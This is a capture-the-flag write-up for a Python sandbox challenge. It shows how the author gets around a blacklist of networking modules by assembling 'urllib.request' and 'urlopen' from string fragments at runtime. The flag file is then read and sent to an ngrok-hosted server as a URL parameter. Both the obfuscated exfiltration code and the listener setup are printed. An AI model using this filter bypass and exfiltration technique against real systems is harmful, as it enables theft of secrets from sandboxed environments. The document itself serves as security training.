# Schrödinger's Sandbox
## Introduction
Your code runs in two parallel universes - one with the real flag, one with a fake. You only see the output if both universes agree.
But even quantum mechanics can't hide everything...
## Challenge Resolution
We are presented an interface where we can write and send `Python` code to be executed on the target. As explained in the introduction, the code runs twice, once with the real flag and once with a fake one.

My idea was to send the flag through an HTTP request to my server. 
#### Launching web server
```sh
python -m http.server
ngrok http 8000
```
#### Sending web request
After several tries, we notice that modules allowing to send web requests are **blacklisted** by the target:
- `requests`
- `urllib`
- `socket`
- `http.client`
In order to bypass the blacklisting, we **truncate** the module and function used:
```python
imp = __import__

u = imp("urlli" + "b" + "." + "req" + "uest", fromlist=["url" + "open"])

flag = open("/flag.txt").read()

getattr(u, "url" + "open")(
    "http://nonproportionally-stayable-emmalee.ngrok-free.dev?flag=" + flag
)

print(flag)
```
`__import__` and `getattr` are **dynamic** function, which means their parameters are evaluated and their actions are done while the `program is running`. Thus, we can use the truncated string as a parameter, since it will be reassembled at runtime.

In the server logs, we find the flag:
```flag
0xfun{schr0d1ng3r_c4t_l34ks_thr0ugh_t1m3}
```
